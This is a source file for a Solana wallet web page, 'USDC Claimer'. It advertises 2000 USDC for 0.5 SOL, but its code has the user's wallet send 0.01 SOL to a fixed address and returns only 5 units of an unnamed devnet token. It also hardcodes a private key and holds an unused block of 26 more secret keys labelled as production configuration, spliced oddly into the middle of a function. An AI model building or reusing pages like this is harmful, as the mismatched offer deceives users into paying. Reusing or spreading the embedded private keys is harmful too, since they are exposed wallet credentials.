/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2Q8Bvf8gLTwbYLgfoWjjXk742eePBJe7UDG7KQkG9MUu3ix3tbAazbffLRGY7iH5kgaeM7QgzodKjoqBxMCr1Krc"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5EnTT7GoGzVMjw5zkw81JGJQZaG8idrJM4h7CvXFuF89S825qvqyZBNMRUHRAe4K1x4xtDDpxjeh4vTd2R9jP3w5",
  "key1": "7v9AC5YgUAvGC5BFdApB87KwH8cahqAakQBfopmPpVrK8JeVczkcXcvgBrc98g5GNnNr1EfwQLhTNXMvRQ2PML9",
  "key2": "2CdfKysqmYNk51GjQ7gejLkHWE176Ecu2JTaKjSKF6JBeGUsmogwrU5YSUnp3DmqvNtKQxRGCYVzUpptGh7d7Dqo",
  "key3": "wSFbmA4GpM6tbqJYFPo69PT3yUUJU22DRMorsgYfJwrgLVi2fkPrHRyQL8XHR7v4LQA3uZ3ZonAetRG2yGS1kNE",
  "key4": "3HCc4L5GErEUyKtBC4bNxqomx8B9kdkNN3WRmyuU77TsKiv2nAqy6mTmCYg4haqfnfWSaWAPi6eQ9ZSnDAT2H2sn",
  "key5": "3a1mADmFH98biULZBtip7sVPA4qdo8BbLmt9EsJpAtNXXQH68xt9g3dJLiSGLcgqYKH12RUzzVdwWDi9CM1PZdyP",
  "key6": "5h52jFPUL5UpB8UMcR7kTPr2k7HFagDnc2EjymfuRPBr8A4krFNTh1psF5JxohAjtsN5FNpHpcHTDZk8mg46tqkF",
  "key7": "3oS7Kw89RRxFK8coCgjoXV6TgfEFcshL1v8KpG1ipp24qugJat9dRp5TvDEaw731Hk9uJqcUehorWPFo5Q6JSS6f",
  "key8": "2Gkf4R1ASRMePrNzSbSpD89vgBWMgmGdHBndDfENTPuZb9XYhkSZKkEd1dAoBghg7ubPMLRZ7hAXhFFZiPRmRSPF",
  "key9": "sBLKAd3vzfhwa3jobJmnunjgBtW5xpyua9iYT9MQxgdL5X65Dt73euC4JGq4Zt2TnTiwscV78QBuANzVN1DsVUn",
  "key10": "2iWWvGMrjw67a59AACpZhNzwHfR81GtSXhzzBReZN2bFceTqbm5unhXMDcGGNJsbNfKa19ybQVAqKaWQF61MGT7o",
  "key11": "C2paUiNQAEsjYX9LRccfHSYukMQBYKW1wFif7BCv4kquhsjp2BCpAv8AgiPoRKBRCqhCE798xWuKqrWQZe2bh9n",
  "key12": "5uQdk2W8hiHfwkKpPH4sEPUNWsLWCA4FAwsK2ViGrbTkt8TCELNLJT2RZ9y5tnVSW8HP1DT1kxGdm4PxLh5zD1Dq",
  "key13": "5zoyYdbWadbZSbEuvbLtEw36Ku3zMPs8XYoB76BPnfWZuRDtQGmfnnNiLbS7rQLwgFuycUVXqmLruofKZ37DwvL4",
  "key14": "559age9A7puwtr2bhbJsfUdYHrzxwvz2aovBKzoeooN591kQiLupYpFAfEchoQFxjDXW91rQq5QLvjkRdTS8Tnja",
  "key15": "5ZCAmCxKb7UXV18JQnDwDDHRu452CAxhjbpXE6TnGRdDC3dmY8JmVkAqZq7i74wHmDe2t3r5D7Jz9vCvxmwWYNCg",
  "key16": "4WWfdDetA8FgrGnVWuMLohUy5MGkebaqCP2b9Wn6zmP4bwz5H9NWA69JDF2LFNe6nMktUW4rUeGfhQxXrFo25XxG",
  "key17": "3R8zEL5FuZ9ZNMU1VEJ2wC2c2wEDzcziRY5SVe7J2ebptoJJSpfvG4dMPEFbQKiRrKtxEuhoFdsFkfrHfjCnhTEf",
  "key18": "2aeDjZzVWyNzRotDbLMA7afcwUMpVzU54qNWcY8stiWdQEx6w4XHjS5sD7DudvUniN3g2fP7f7onWNdqfM2rQj4o",
  "key19": "4W5Yy9ea3ap3N7gtKsoDGubU1wb4PWQe5YbeYrXqLRxEnWHxYq3D95SkiP8hC9cr6nXGEsQmhWWhrYV9kqh3ucgC",
  "key20": "DE2v2ypgporSBx2chAKA47WCMEV2f9Up75yXMbexAKFrp6dHZmbZ4HWRzakyUDiceJmFm9w6Wd82QNRdbmieRGF",
  "key21": "2aHed5NdoPjmcnRcrews89piaKpMXUi2CP3AtBBK1QUu29kt7TsozAFW7HnhuhtKMLUXYYAm8Z233FSqPwuBzgGx",
  "key22": "3V5czYKvCeCsjzgUXuxHjzpMCK8o6Mte9zRMuADwvBVxYDSDBeHFWkGxiook5Me6JLumaz77gBCf2dumpbHc2yeu",
  "key23": "UHeJ2Quo8qrnmhgrmSf7QMKW2PTvqFxEM4qD3nEGqpKgZy9H48cDwFK3mVae9H5Nwkqty9AcSV32zxzkpWrrUDe",
  "key24": "5p84U3phBSsTwQq5yhKmkwc484gNCk42oyK4MupLrm55UEGyzxAMEdFVTqwRgJMjnStqi3tNziq66Fe85CkH1QG1",
  "key25": "3dqRhz1fgUCfmMsKNwqJoGFim4m1KjCKr7mWCErHrTdL2M4nPULfQSvwwSerqqa1vVj5AT88xvv8xri49zCagXWe"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
